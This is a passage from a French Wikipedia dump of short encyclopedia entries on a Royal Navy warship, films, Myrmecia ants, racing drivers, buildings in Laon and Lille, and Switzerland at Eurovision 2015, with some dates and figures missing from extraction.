Ce fut aussi le premier navire de la Royal Navy entièrement éclairé à l'électricité, et le premier à être équipé de tubes lance-torpilles. Ses génératrices électriques distribuaient un courant continu sous une tension de 800 volts, permettant d'alimenter des lampes à arc dans les salles des machines, et des lampes à incandescence modèle Swan pour le reste du navire. Le câblage était encore trop complexe, puisqu'il associait en série 18 lampes Swan et une lampe à arc par circuit. Chaque lampe était fixée par un commutateur basculant automatiquement sur une résistance pour maintenir la continuité du circuit quand une lampe grillait. Cette installation fut aussi la cause de la première électrocution fatale dans la Royal Navy en 1882, ce qui incita la marine britannique à standardiser la tension électrique de service de ses bâtiments à .
Le navire comportait bien d'autres nouveautés, dont les ballasts destinés à amortir le roulis, qui s'avérèrent finalement inutiles. La plupart des pièces du navire étaient éclairées artificiellement, ce qui poussa le capitaine Fisher à faire peindre les différents niveaux du pont de couleurs conventionnelles, pour aider les membres de l'équipage à se repérer dans les coursives.
Service en mer.
À son inauguration, le navire partit rejoindre l'escadre de Méditerranée. Il participa au Bombardement d'Alexandrie le au cours de la Révolte du colonel Urabi, tirant et fut lui-même touché deux fois : un obus de () tua le charpentier, blessa mortellement un officier de batterie et blessa un marin. Les détonations des canons de de l’"Inflexible" endommagèrent elles-mêmes la superstructure du navire.
Les réparations eurent lieu à Portsmouth en 1885, à l'occasion de la pose du nouveau gréement. Le vaisseau fut ensuite affecté à la Réserve de la Flotte jusqu'en 1890, à l'exception d'une brève mission en 1887 et des manœuvres de 1889 et de 1890. Il fut réaffecté à l'Escadre de Méditerranée entre 1890 et 1893, puis commis à la garde de Portsmouth jusqu'en 1897, et enfin de nouveau affecté à la Réserve jusqu'en , avant d'être vendu à un ferrailleur de Chatham en 1903.

</doc>
<doc id="8730320" url="https://fr.wikipedia.org/wiki?curid=8730320" title="La Maison de sable">
La Maison de sable

La Maison de sable (en ) est un film brésilien réalisé par Andrucha Waddington et sorti en 2005 avec comme actrices principales Fernanda Montenegro et sa fille Fernanda Torres.
"La Maison de sable" a été entièrement été tourné sur la côte nord du Brésil, dans le parc national des Lençóis Maranhenses.
Le film est lauréat du prix Alfred P. Sloan au festival du film de Sundance 2006.

</doc>
<doc id="8730324" url="https://fr.wikipedia.org/wiki?curid=8730324" title="Casa de Areia">
Casa de Areia



</doc>
<doc id="8730328" url="https://fr.wikipedia.org/wiki?curid=8730328" title="Jerry Hoyt">
Jerry Hoyt

Jerry Hoyt est un pilote automobile d'IndyCar américain, né le à Chicago (Illinois, États-Unis) et mort le à Oklahoma City. Il a notamment disputé à quatre reprises les 500 miles d'Indianapolis, entre 1950 et 1955. Il débuta en compétition en catégorie Midget en 1947, et c'est dans une de ces courses qu'il fut victime d'un accident mortel, à l'âge de vingt-six ans.

</doc>
<doc id="8730336" url="https://fr.wikipedia.org/wiki?curid=8730336" title="Centre d’études nucléaires de Saclay">
Centre d’études nucléaires de Saclay



</doc>
<doc id="8730347" url="https://fr.wikipedia.org/wiki?curid=8730347" title="Obselidia">
Obselidia

Obselidia est un film américain écrit et réalisé par Diane Bell, sorti en 2010 et mettant en vedette Michael Piccirilli, Gaynor Howe et Frank Hoyt Taylor.
Le film a remporté deux prix au festival du film de Sundance 2010, le prix d'excellence en cinématographie et le prix Alfred P. Sloan.

</doc>
<doc id="8730359" url="https://fr.wikipedia.org/wiki?curid=8730359" title="Turbine Hélice">
Turbine Hélice



</doc>
<doc id="8730365" url="https://fr.wikipedia.org/wiki?curid=8730365" title="Fortini/Cani">
Fortini/Cani

Fortini/Cani est un film italien réalisé par Jean-Marie Straub et Danièle Huillet, sorti en 1976.
Synopsis.
Après "Introduction à la « Musique d'accompagnement pour une scène de film »" et "Moïse et Aaron", "Fortini/Cani" est le troisième volet de cette sorte de « Triptyque juif » des Straub-Huillet. 
Franco Fortini y lit de nombreux extraits de son livre "Les Chiens du Sinaï" ("I Cani del Sinai"), dans lequel il évoque notamment la condition des Juifs pendant la guerre, la politique internationale, le judaïsme, Israël et la Palestine.

</doc>
<doc id="8730381" url="https://fr.wikipedia.org/wiki?curid=8730381" title="Sandra Studer">
Sandra Studer

Sandra Studer (née le à Zurich) est une animatrice de télévision et chanteuse suisse, aussi sous le pseudonyme de Sandra Simó.
Biographie.
Cette fille d'un père suisse et d'une mère espagnole grandit à Zollikerberg. Après une formation en danse et en piano, elle monte sur scène pour chanter pour la première fois à 17 ans. Elle étudie la germanistique et la musicologie à l'université de Zurich. Elle fait son premier enregistrement en 1987. En 1989, Sandra Studer est choriste dans la chanson de DJ BoBo "I Love You".
Sous le nom de Sandra Simó, elle représente la Suisse au Concours Eurovision de la chanson 1991 ; la chanson italophone "Canzone per te" finit à la place, sur 22 participants.
Elle se consacre ensuite à une carrière à la télévision. Elle est la commentatrice germanophone du Concours Eurovision de la chanson pour la SRG SSR. En 1999, elle anime à côté d'Axel Bulthaupt le concours sélectif pour l'Allemagne. De 2002 à 2012, elle anime le gala annuel des SwissAward.
Elle se produit également dans des programmes musicaux en Allemagne.
Le , il est annoncé qu'elle fait partie des trois animatrices du Concours Eurovision de la chanson 2025, qui se déroule du au à Bâle en Suisse, aux côtés de Hazel Brugger et Michelle Hunziker.
Liens externes.
 

</doc>
<doc id="8730385" url="https://fr.wikipedia.org/wiki?curid=8730385" title="Raphaëlle Pache">
Raphaëlle Pache

Raphaëlle Pache, née à Lyon le , est une spécialiste française de littérature du , traductrice du russe vers le français.
Biographie.
Raphaëlle Pache, agrégée de lettres modernes, a soutenu en 2000 à l'Université Paris-VIII une thèse de littérature comparée intitulée « Le grotesque : la beauté du réel : Œuvres narratives de Victor Hugo et Nicolas Gogol », préparée sous la direction de Jacques Neefs, spécialiste de l'histoire et la théorie du roman aux .
Elle a écrit "Littérature russe en cours de français : lectures analytiques et lectures cursives" publié par le CRDP de l'académie de Grenoble en 2004.
Distinctions et récompenses.
Elle a obtenu une mention spéciale pour sa traduction de "Vongozero" de Yana Vagner pour le Prix Russophonie 2015.

</doc>
<doc id="8730387" url="https://fr.wikipedia.org/wiki?curid=8730387" title="XVIII Dicembre">
XVIII Dicembre



</doc>
<doc id="8730388" url="https://fr.wikipedia.org/wiki?curid=8730388" title="Xalqlar Dostluğu">
Xalqlar Dostluğu



</doc>
<doc id="8730390" url="https://fr.wikipedia.org/wiki?curid=8730390" title="Xantippe">
Xantippe



</doc>
<doc id="8730396" url="https://fr.wikipedia.org/wiki?curid=8730396" title="Xaçmaz">
Xaçmaz



</doc>
<doc id="8730406" url="https://fr.wikipedia.org/wiki?curid=8730406" title="Ludwig Schytte">
Ludwig Schytte



</doc>
<doc id="8730409" url="https://fr.wikipedia.org/wiki?curid=8730409" title="Carcharhinus falciformis">
Carcharhinus falciformis



</doc>
<doc id="8730415" url="https://fr.wikipedia.org/wiki?curid=8730415" title="Valley of Saints">
Valley of Saints

 est un film indien en cachemiri écrit et réalisé par Musa Syeed et sorti en 2012. Ce film dramatique qui mêle fiction et documentaire et dont l'action se déroule au lac Dhal à Srinagar, est le premier long métrage du réalisateur qui soulève également un problème environnemental concernant ce lac.
Au festival du film de Sundance 2012, le film a remporté le prix du public pour un film dramatique mondial ainsi que le prix Alfred P. Sloan, à égalité avec le film américain "Robot and Frank".

</doc>
<doc id="8730420" url="https://fr.wikipedia.org/wiki?curid=8730420" title="Kabupaten de Pangandaran">
Kabupaten de Pangandaran

Le kabupaten de Pangandaran, en indonésien , est un kabupaten dans la province de Java occidental. Son chef-lieu est .
Le kabupaten a été créé en 2012 par détachement de celui de Ciamis.
Géographie.
Le "kabupaten" de Pangandaran est bordé :

</doc>
<doc id="8730423" url="https://fr.wikipedia.org/wiki?curid=8730423" title="Myrmecia chrysogaster">
Myrmecia chrysogaster

Myrmecia chrysogaster est une espèce de fourmi originaire d'Australie. Les plus fortes populations de cette fourmi géante se trouvent dans l'est du pays, surtout dans la partie méridionale des États du Queensland et de la Nouvelle-Galles du Sud.
L'espèce est décrite pour la première fois en 1943.
Nom vernaculaire et classement.
Du fait de son agressivité, cet insecte social est aussi connu sous le nom vernaculaire de .
La fourmi bouledogue appartient au genre "Myrmecia", à la sous-famille "Myrmeciinae".
La plupart des ancêtres des fourmis du genre "Myrmecia" n'ont été retrouvés que dans des fossiles, à l’exception de "Nothomyrmecia macrops", seul parent vivant actuellement.
Biologie.
La taille des ouvrières de l'espèce "Myrmecia chrysogaster" est d'environ de long. "Myrmecia chrysogaster" présente des pattes jaunes, des antennes, des mandibules, un thorax et un abdomen bruns. Sa tête est d'un brun tirant vers le noir. Son corps est couvert de poils épars, très fins et courts, de couleur jaune ; cette pubescence peut être très abondante au niveau de l'abdomen.

</doc>
<doc id="8730429" url="https://fr.wikipedia.org/wiki?curid=8730429" title="Hôtel-Dieu de Laon">
Hôtel-Dieu de Laon

L'hôtel-Dieu de Laon était un Hôtel-Dieu situé à Laon, en France qui sert actuellement Maison des Arts et Loisirs.
Il y a à Laon trois Hôtel-Dieu successifs : L'Hôtel-Dieu situé au Sud du parvis de la Cathédrale qui est classé monument historique et occupé par l'Office de Tourisme, celui qui a été construit ensuite par les chanoines, sur le même parvis, mais au Nord, transformé en Maison des Arts et loisirs et enfin celui qui a été transplanté dans l'ancienne abbaye St Martin.
Localisation.
L'Hôtel-Dieu du est situé en ville-haute, au cœur de la ville médiévale en tenant le nord est du parvis de la cathédrale de Laon. Adresse : place Aubry ; 63 rue Sérurier.
Historique.
Un nouvel Hôtel-Dieu, inscrit à l'inventaire général du patrimoine culturel, est construit au à l'opposé du parvis de la Cathédrale. C'est en 1209 que les chanoines achètent, en face du palais de l'évêque la maison de Raoul d'Aulnois afin d'y transférer l'hôtel-Dieu trop à l'étroit au sud du parvis de la cathédrale. La difficile acquisition des parcelles voisines ne permet d'élever le nouvel hôtel-Dieu qu'en 1273 ; pour éviter la ruine, d'importants travaux sont entrepris dans les années 1670-1677 (ancres datées) ; la porte sur la place Aubry et la niche la surmontant, exécutées en 1677 par le maître maçon Jean Hottin, ouvraient sur une nouvelle salle des malades pour les femmes, faite d'après les plans d'Innocent Bourgeois ; la chapelle est remaniée en 1683 par les maîtres maçons Toussaint Goulot et Adrien Falvy. Elle reçoit en 1729 un autel sculpté par Etienne Robillon, sculpteur à Mézières ; après le transfert de l'hôtel-Dieu dans l'ancienne abbaye Saint-Martin, les bâtiments sont partiellement occupés par une école communale (1813-1880) , partiellement affectés à l'armée. Après les dommages de la guerre 1914-1918, les façades sont classées Monuments historiques en 1928, mais la grande salle des malades disparaît en 1929 au profit d'un marché couvert dû à l'architecte Abella ; son ossature de fer et de béton est rhabillée en 1970 (date portée) par l'architecte Vallon qui aménage les bâtiments en maison des arts et loisirs. Des bâtiments anciens, seules demeurent la porte sur la place Aubry (1677) et l'aile abritant le couvent des sœurs et des frères (1670, 1677) à l'ouest des constructions modernes. Il fut transformé en 1931 en halles, bouchers et poissonniers deux jours par semaine et le reste du temps en salle de sport ; puis au début des années 1970 en Maison des Arts et Loisirs (M.A.L.) qui est le lieu de diffusion culturelle la Ville de Laon.

</doc>
<doc id="8730430" url="https://fr.wikipedia.org/wiki?curid=8730430" title="Valley of Saints (film)">
Valley of Saints (film)



</doc>
<doc id="8730433" url="https://fr.wikipedia.org/wiki?curid=8730433" title="Terry's Tea Party">
Terry's Tea Party

 est un film muet américain réalisé par Larry Semon, sorti en 1916.

</doc>
<doc id="8730434" url="https://fr.wikipedia.org/wiki?curid=8730434" title="Église Saint-Loup">
Église Saint-Loup

Plusieurs églises portent ce nom :

</doc>
<doc id="8730442" url="https://fr.wikipedia.org/wiki?curid=8730442" title="Myrmecia nobilis">
Myrmecia nobilis

Myrmecia nobilis est une espèce de fourmi originaire d'Australie. Les plus fortes populations de cette fourmi géante se trouvent dans le sud-est du pays, surtout sur dans la région de Melbourne.
L'espèce est décrite pour la première fois en 1943.
Nom vernaculaire et classement.
Du fait de son agressivité, cet insecte social est aussi connu sous le nom vernaculaire de .
La fourmi bouledogue appartient au genre "Myrmecia", à la sous-famille "Myrmeciinae".
La plupart des ancêtres des fourmis du genre "Myrmecia" n'ont été retrouvés que dans des fossiles, à l’exception de "Nothomyrmecia macrops", seul parent vivant actuellement.
Biologie.
La taille des ouvrières de l'espèce "Myrmecia nobilis" varie de 10 à de long ; les reines peuvent atteindre . "Myrmecia nobilis" présente des mandibules jaunâtres et des antennes brunes. Le dessus de son thorax est brun ; sa tête, son abdomen et ses pattes sont généralement noirs. Son corps est couvert de poils épars, très fins et courts, de couleur jaune ; cette pubescence peut être très abondante et grise au niveau de l'abdomen.

</doc>
<doc id="8730443" url="https://fr.wikipedia.org/wiki?curid=8730443" title="Planète enflée">
Planète enflée

Un Saturne chaud () ou une planète enflée ("") est une planète géante gazeuse de grand rayon, de température de surface élevée et de masse volumique faible, comparable ou inférieure (parfois très inférieure) à celle de Saturne. En d'autres termes, une planète de ce type est un Jupiter chaud de faible densité.
Explication théorique.
Les planètes enflées orbitent très près de leur étoile, ce qui implique que l'intense chaleur qu'elles reçoivent de leur étoile cumulée à leur chaleur interne « gonfle » leur atmosphère (dilatation thermique).
Taille et masse.
La plupart de ces planètes ont une masse inférieure à deux fois celle de Jupiter. Les planètes plus massives ont en effet une gravité plus élevée, ce qui fait que leur taille ne dépasse guère celle de Jupiter.
Cependant, même en prenant en compte la chaleur de l'étoile, nombre de planètes qui transitent devant leur étoile ont un rayon plus important que celui prévu par la théorie. Ceci pourrait provenir de l'interaction entre le vent stellaire et la magnétosphère de la planète, qui créerait un courant électrique dans la planète, ce qui la chaufferait encore plus et la ferait ainsi enfler. Plus une étoile est magnétiquement active, plus cette interaction devrait être importante et plus le courant électrique induit devrait l'être aussi, ce qui à son tour devrait induire un chauffage et une expansion de la planète plus importants. Cette prédiction théorique correspond aux observations, pour lesquelles une corrélation entre l'activité stellaire et le rayon planétaire est mesurée.

</doc>
<doc id="8730451" url="https://fr.wikipedia.org/wiki?curid=8730451" title="Gare de Takamatsu">
Gare de Takamatsu

La est une gare ferroviaire située à Takamatsu, dans la préfecture de Kagawa au Japon. C'est la principale gare de la ville. Elle est exploitée par la JR Shikoku.
Situation ferroviaire.
Gare terminus, la gare de Takamatsu marque le début des lignes Kōtoku et Yosan.
Histoire.
La gare de Takamatsu a été inaugurée le .
Service des voyageurs.
Accueil.
La gare dispose d'un bâtiment voyageurs, avec guichets, ouvert tous les jours de 4h20 à 23h00.
Intermodalité.
La gare de Takamatsu-Chikkō de la compagnie Kotoden se trouve à à l'est de la gare.

</doc>
<doc id="8730452" url="https://fr.wikipedia.org/wiki?curid=8730452" title="Église Saint-Loup de Saint-Loup">
Église Saint-Loup de Saint-Loup



</doc>
<doc id="8730464" url="https://fr.wikipedia.org/wiki?curid=8730464" title="Myrmecia occidentalis">
Myrmecia occidentalis

Myrmecia occidentalis est une espèce de fourmi originaire d'Australie. Les plus fortes populations de cette fourmi géante se trouvent dans le sud-ouest du pays, en particulier dans l'agglomération de Perth.
L'espèce est décrite pour la première fois en 1943.
Nom vernaculaire et classement.
Du fait de son agressivité, cet insecte social est aussi connu sous le nom vernaculaire de .
La fourmi bouledogue appartient au genre "Myrmecia", à la sous-famille "Myrmeciinae".
La plupart des ancêtres des fourmis du genre "Myrmecia" n'ont été retrouvés que dans des fossiles, à l’exception de "Nothomyrmecia macrops", seul parent vivant actuellement.
Biologie.
La taille des ouvrières de l'espèce "Myrmecia occidentalis" varie de 11 à de long ; les reines peuvent atteindre de long. "Myrmecia occidentalis" présente une tête et un abdomen noirs, des mandibules jaunes. Ses antennes et ses pattes sont généralement jaunâtres. Son corps est couvert de poils épars, très fins et courts, de couleur jaune ; cette pubescence peut être très abondante et blanche au niveau de l'abdomen.

</doc>
<doc id="8730467" url="https://fr.wikipedia.org/wiki?curid=8730467" title="Johnny Thomson">
Johnny Thomson

Johnny Thomson est un pilote automobile d'IndyCar américain, né le à Lowell (Massachusetts), États-Unis) et mort le à Allentown (Pennsylvanie). Il a notamment disputé à huit reprises les 500 miles d'Indianapolis, entre 1953 et 1960. Il débuta en compétition en 1938. C'est au cours d'une course de Midgets qu'il fut victime d'un accident mortel, à l'âge de trente-huit ans.

</doc>
<doc id="8730473" url="https://fr.wikipedia.org/wiki?curid=8730473" title="Église Saint-Pierre-et-Saint-Paul de La Roche-Mabile">
Église Saint-Pierre-et-Saint-Paul de La Roche-Mabile



</doc>
<doc id="8730475" url="https://fr.wikipedia.org/wiki?curid=8730475" title="Gare de triage de Lille-Délivrance">
Gare de triage de Lille-Délivrance

La gare de triage de Lille-Délivrance est une gare de triage française, située dans la commune associée de Lille qu'est Lomme.
Histoire.
L'édification d'une gare de triage autour de Lille est décidée en par le gouvernement. Au lendemain de la Première Guerre mondiale, le réseau ferroviaire du Nord-Pas-de-Calais est dévasté et doit être reconstruit puis développé devant la croissance du trafic. La création d'un site de triage à l'ouest de l'agglomération lilloise est choisi et les critères de sélection amènent à retenir des terres quasi inhabitées de la commune de Lomme. Le nom « Délivrance » est choisi en hommage à la fin de l'occupation allemande de la région lilloise durant la Première Guerre mondiale. À proximité du site, un quartier d'habitation pour le personnel travaillant dans la gare est bâti. Cette cité-jardin comporte 835 habitations ce qui en fait l'une des plus importantes du réseau après celle de Tergnier, avec des critères qualitatifs élevés pour l'époque concernant leur équipement (eau courante, électricité, WC intérieur...). La Compagnie des chemins de fer du Nord établit un projet d'une gare de « Lille-la-Délivrance » en et sollicite sa mise en application en urgence. La demande est validée au niveau gouvernemental le et un décret est signé par le président de la République Paul Deschanel le lendemain. La gare est en service à partir de .
Durant la Seconde Guerre mondiale, le site est la cible d'un bombardement de la "Royal Air Force" la nuit du 9 au . Ce bombardement s'inscrit dans la préparation du débarquement et vise à rendre les infrastructures ferroviaires inutilisables pour l'armée allemande. Ce bombardement touche la gare, le quartier environnant mais aussi les communes avoisinantes telles que Faches-Thumesnil ou Haubourdin et jusque Marquette. Le site à bombarder a une dimension de 3,2 kilomètres carrés et des bombes tombent sur une étendue de 56 kilomètres carrés. De 500 à 616 morts sont à dénombrer. La région lilloise est la cible de bombardements depuis 1941 mais c'est à cette occasion que pour la première fois des signes d'hostilité parmi la population envers les Alliés sont relevés et signalés par la Résistance locale. La ligne principale passant en gare est remise en état dès le .
La gare cesse son activité de triage en .

</doc>
<doc id="8730481" url="https://fr.wikipedia.org/wiki?curid=8730481" title="Myrmecia vindex">
Myrmecia vindex

Myrmecia vindex est une espèce de fourmis originaire d'Australie. Les plus fortes populations de cette fourmi géante se trouvent dans le sud-ouest du pays.
L'espèce est décrite pour la première fois en 1858.
Nom vernaculaire et classement.
Du fait de son agressivité, cet insecte social est aussi connu sous le nom vernaculaire de .
La fourmi bouledogue appartient au genre "Myrmecia", à la sous-famille "Myrmeciinae".
La plupart des ancêtres des fourmis du genre "Myrmecia" n'ont été retrouvés que dans des fossiles, à l’exception de "Nothomyrmecia macrops", seul parent vivant actuellement.
Biologie.
Description.
La taille des ouvrières de "Myrmecia vindex" varie de 17 à de long. La reine peut cependant atteindre une longueur de . "Myrmecia vindex" possède généralement une tête, un thorax et des pattes de couleur rouille. Ses mandibules sont jaunes ; ses antennes et son abdomen sont noirs. Son corps est couvert de fins poils jaunes et épars ; cette pubescence peut être grisâtre et très abondante au niveau de l'abdomen.
Comportement nécrophorique.
"Myrmecia vindex" exhibe un comportement nécrophorique. En effet, dans la fourmilière des chambres sont réservées aux déchets, en particulier aux cadavres. C'est une mesure d'hygiène car la décomposition des cadavres entraîne la prolifération de micro-organismes divers, souvent pathogènes. Ces fourmis sont capables de détecter des substances chimiques résultantes de la décomposition post-mortem de l'hémolymphe des fourmis mortes.

</doc>
<doc id="8730486" url="https://fr.wikipedia.org/wiki?curid=8730486" title="Bac Horgen-Meilen">
Bac Horgen-Meilen



</doc>
<doc id="8730488" url="https://fr.wikipedia.org/wiki?curid=8730488" title="Ferry-boat Horgen-Meilen">
Ferry-boat Horgen-Meilen



</doc>
<doc id="8730489" url="https://fr.wikipedia.org/wiki?curid=8730489" title="Peter Polycarpou">
Peter Polycarpou

Peter Polycarpou, né le à Brighton en Angleterre, est un acteur britannico-chypriote grec de télévision et de cinéma.
Biographie.
Peter Polycarpou est notamment connu pour jouer Chris Theodopolopoudos dans la série télévisée "Birds of a Feather".

</doc>
<doc id="8730496" url="https://fr.wikipedia.org/wiki?curid=8730496" title="Independent.co.uk">
Independent.co.uk



</doc>
<doc id="8730497" url="https://fr.wikipedia.org/wiki?curid=8730497" title="Raw Forever">
Raw Forever

Raw Forever est une compilation de Cormega, sortie le .
Le premier disque reprend des succès du rappeur tandis que le deuxième propose onze remixes avec des parties instrumentales "live" interprétées par le groupe The Revelations.

</doc>
<doc id="8730498" url="https://fr.wikipedia.org/wiki?curid=8730498" title="Suisse au Concours Eurovision de la chanson 2015">
Suisse au Concours Eurovision de la chanson 2015

La Suisse est un des quarante pays participants au Concours Eurovision de la chanson 2015, qui se déroule à Vienne en Autriche. Le pays est représenté par Mélanie René et sa chanson "Time to Shine", sélectionnées via l'émission "Die große Entscheindungsshow".
Sélection.
La participation du pays a été confirmée le .
Format.
La sélection suisse, collaboration entre les différents diffuseurs suisses , est divisée en trois grandes étapes.
Dans un premier temps, les diffuseurs SRF/RTR, RTS et RSI sélectionnent chacun de leur côté un certain nombre de candidats . Ensuite, ces dix-huit candidats participent à un "Expert Check", lors duquel un jury expert affine la sélection à trois candidats pour SRF/RTR, deux pour RTS et un pour RSI. Ces artistes participent alors à la sélection télévisée durant laquelle l'artiste et la chanson représentant la Suisse sont désignés.
Sélections des diffuseurs.
Sélection de SRF/RTR.
Les diffuseurs SRF et RTR ont lancé un appel à candidatures entre le et le . Au terme de cette période, 210 chansons avaient été reçues par les diffuseurs. Les 210 chansons ont ensuite été soumises à un vote sur une plateforme Internet, entre le 3 et le . Les neuf chansons arrivées en tête sont qualifiées pour l"Expert Check".
Sélection de RTS.
Le diffuseur RTS a lancé un appel à candidatures entre le et le . Au terme de cette période, 26 chansons avaient été reçues par le diffuseur. Après cela, dix d'entre elles ont été choisies pour participer à une émission radiophonique, le , lors de laquelle six artistes ont été sélectionner pour participer lors de l"Expert Check".
Sélection de RSI.
Le diffuseur RSI a lancé un appel à candidatures entre le et le . Au terme de cette période, 28 chansons avaient été reçues par le diffuseur. Le , un jury composé de Simone Tomassini, Iris Moné et Paolo Meneguzzi sélectionne les trois chansons se qualifiant pour l'Expert Check".
"Expert Check".
L"Expert Check" a lieu le . Le jury est composé de Rafael Antonio, Freda Goodlett, Moritz Faccin, Catherine Colombara et Nicola Locarnini. Trois chansons de SRF/RTR, deux de RTS et une de RSI sont sélectionnées pour la partie télévisée de la sélection.
Mélanie René et sa chanson "Time to shine" furent choisis parmi 6 artistes le à la suite d'une sélection nationale.
"Die Große Entscheidungsshow".
La sélection se termine lors de l'émission "Die Große Entscheidungsshow" le . Le gagnant est désigné parmi les six chansons encore en lice par un vote composé pour moitié du télévote suisse et pour l'autre moitié du vote d'un jury expert. Au terme de cette émission, la chanteuse Mélanie René est désignée représentante de la Suisse pour l'Eurovision 2015 avec sa chanson "Time to Shine".
À l'Eurovision.
La Suisse a participé à la seconde demi-finale, le . Arrivant en et dernière position avec , le pays ne s'est pas qualifié pour la finale.

</doc>
<doc id="8730501" url="https://fr.wikipedia.org/wiki?curid=8730501" title="Götaplatsen">
Götaplatsen

La Götaplatsen est l'une des places emblématiques de la ville de Göteborg en Suède et est située à l'extrêmité sud de l'Avenyn, principale artère de la ville. La place fut inaugurée lors de l'exposition industrielle internationale de 1923, célébrant par la même occasion les 300 ans de la création de la ville.
Götaplatsen est l'épicentre de la culture à Göteborg, étant bordée par la Konserthus (salle de concert où office l'Orchestre symphonique de Göteborg), la Konsthall (centre d'art contemporain), le Konstmuseum (musée des Beaux-arts), le Stadsteater (théatre municipal) et la Stadsbibliotek (bibliothèque municipale). 
Au centre de la place trône une fontaine ornée d'une statue en bronze représentant Poséidon. Réalisée par Carl Milles, cette œuvre est devenue un symbole majeur d'une ville qui fut et reste portée vers la mer.
Chaque année, le festival culturel de la ville réunit différents artistes suédois pour des représentations gratuites sur la place.
La manifestation de soutien à l'attentat contre Charlie Hebdo s'est notamment tenu sur Götaplatsen la .

</doc>
<doc id="8730503" url="https://fr.wikipedia.org/wiki?curid=8730503" title="Église Saint-Maixant">
Église Saint-Maixant



</doc>
<doc id="8730504" url="https://fr.wikipedia.org/wiki?curid=8730504" title="Église Saint-Maixant de Saint-Maixant">
Église Saint-Maixant de Saint-Maixant



</doc>
<doc id="8730505" url="https://fr.wikipedia.org/wiki?curid=8730505" title="Langdon Cheves Easton">
Langdon Cheves Easton

Langdon Cheves Easton est un major-général américain de l'Union, né le à Saint-Louis, dans le Missouri, et mort le à New York.
Biographie.
Il est le fils de Rufus Easton et de Abial Alby Smith. Il est diplômé de West Point, classe de 1838.
À sa sortie de West Point, Langdon C. Easton est enrôlé comme 2nd lieutenant dans le d'infanterie de l'armée américaine avec lequel il combat pendant la seconde guerre séminole, à , puis accède au grade de , toujours dans le d'infanterie.
À partir de 1847, il est promu capitaine au sein du Quartier Général avant d'être nommé major en et de devenir responsable du Quartier Général de l'armée de Cumberland jusqu'en mai 1864, et chef du Quartier Général des armées du général Sherman jusqu'en 1865 où il est fait colonel "ex officio" après avoir participé à la campagne de Chattanooga et à la campagne d'Atlanta, ainsi qu'à Savannah.
Il est promu général de brigade le et major-général le .
Après la guerre, il sert au Quartier Général du Département militaire du Mississippi, puis du Missouri jusqu'en 1872. Jusqu'en 1875, il est responsable des Dépôts de Philadelphie et de l'Arsenal de Schuylkill et responsable du Dépôt Général de New York jusqu'en 1881, année où il se retire du service actif.
Il meurt le à New York et est inhumé au cimetière de West Point.

</doc>
<doc id="8730515" url="https://fr.wikipedia.org/wiki?curid=8730515" title="Église Saint-Marcouf">
Église Saint-Marcouf



</doc>
<doc id="8730516" url="https://fr.wikipedia.org/wiki?curid=8730516" title="Église Saint-Marcouf de Saint-Marcouf">
Église Saint-Marcouf de Saint-Marcouf



</doc>
<doc id="8730517" url="https://fr.wikipedia.org/wiki?curid=8730517" title="Joseph Ascher">
Joseph Ascher

, né le à Groningue – mort le à Londres, est un compositeur et pianiste néerlandais.
Biographie.
Ascher était d’origine juive (son père était le hazzan de la ville). Il a commencé ses études musicales à Londres avant de les poursuivre au conservatoire de Leipzig sous la férule d’Ignaz Moscheles mais ne fut pas diplômé.
Son talent pianistique fut remarqué par l’impératrice Eugénie, qui lui proposa de devenir pianiste à la cour en 1849.
En 1865 il retourna à Londres. À Paris, Émile Waldteufel lui succéda comme pianiste attitré à la cour.

</doc>
<doc id="8730518" url="https://fr.wikipedia.org/wiki?curid=8730518" title="Fief de la Petite Bretonnerie">
Fief de la Petite Bretonnerie



</doc>
<doc id="8730526" url="https://fr.wikipedia.org/wiki?curid=8730526" title="Rue Saint-Étienne-des-Grés">
Rue Saint-Étienne-des-Grés



</doc>
<doc id="8730527" url="https://fr.wikipedia.org/wiki?curid=8730527" title="Collège de Torchi">
Collège de Torchi



</doc>
<doc id="8730528" url="https://fr.wikipedia.org/wiki?curid=8730528" title="Via Ostiense">
Via Ostiense



</doc>
<doc id="8730538" url="https://fr.wikipedia.org/wiki?curid=8730538" title="Teotl (mythologie aztèque)">
Teotl (mythologie aztèque)

Le Teotl est l'élément central de la religion aztèque et de la philosophie aztèque.
Le concept est encore mal compris des occidentaux, mais il ne désigne pas exactement un dieu mais plutôt les forces de la nature.
Le concept était représenté par des ixiptla.
À leur arrivée, les conquistadores furent nommés ainsi par les Aztèques.

</doc>
<doc id="8730540" url="https://fr.wikipedia.org/wiki?curid=8730540" title="Bergen Studentidrettslag">
Bergen Studentidrettslag

Le , ou plus simplement BSI, est un club omnisports universitaire basé à Bergen en Norvège.
Fondé en 1946, le club est impliqué dans 24 sports différents.
Il est notamment connu pour sa section féminine de volley-ball qui a remporté cinq championnats de Norvège (1979, 1980, 1981, 1987, 1991). Les volleyeurs masculins ont également deux championnats (1976, 1979) à leur palmarès.
Sa section masculine de handball a remporté le Championnat de Norvège en 1969.

</doc>
<doc id="8730551" url="https://fr.wikipedia.org/wiki?curid=8730551" title="John Livingston (acteur)">
John Livingston (acteur)

John Livingston, né le à Ames (Iowa) aux États-Unis, est un acteur américain.

</doc>
<doc id="8730561" url="https://fr.wikipedia.org/wiki?curid=8730561" title="Chapitre de Saint-Merri">
Chapitre de Saint-Merri



</doc>
<doc id="8730562" url="https://fr.wikipedia.org/wiki?curid=8730562" title="Mega Philosophy">
Mega Philosophy

Mega Philosophy est le sixième album studio de Cormega, sorti le .
L'album, qui est entièrement produit par Large Professor, s'est classé au Top Rap Albums et au Top R&amp;B/Hip-Hop Albums.

</doc>
<doc id="8730563" url="https://fr.wikipedia.org/wiki?curid=8730563" title="John Livingston">
John Livingston

John Livingston est un patronyme porté notamment par les personnalités suivantes :

</doc>
<doc id="8730572" url="https://fr.wikipedia.org/wiki?curid=8730572" title="Chuck Parsons">
Chuck Parsons

Charles W. "Chuck" Parsons, né le à (Kentucky) et décédé le à Walnut (Californie) âgé de 74 ans, est un pilote automobile américain sur circuits à bord de voitures de sport, Grand tourisme et Sport-prototypes.
Biographie.
À 24 ans il s'installe en Californie, près de Monterey et travaille alors dans la vente d'automobiles (souvent importées).
Il débute alors sa carrière en 1958 (à Stockton, sur Austin-Healey 100). En SCCA National Sports Car Championship, il gagne trois fois sa catégorie de course entre 1958 et 1959, et il s'impose à Riverside sur Porsche 356 Carrera GT durant cette dernière saison, où il a aussi l'occasion de courir sur Maserati Birdcage. En 1961 il inscrit son nom aux 3 Heures de Cotati avec une Ferrari 250 TR dans le championnat Sport de la côte Pacifique, puis il termine troisième des 6 Heures de Riverside en 1963.
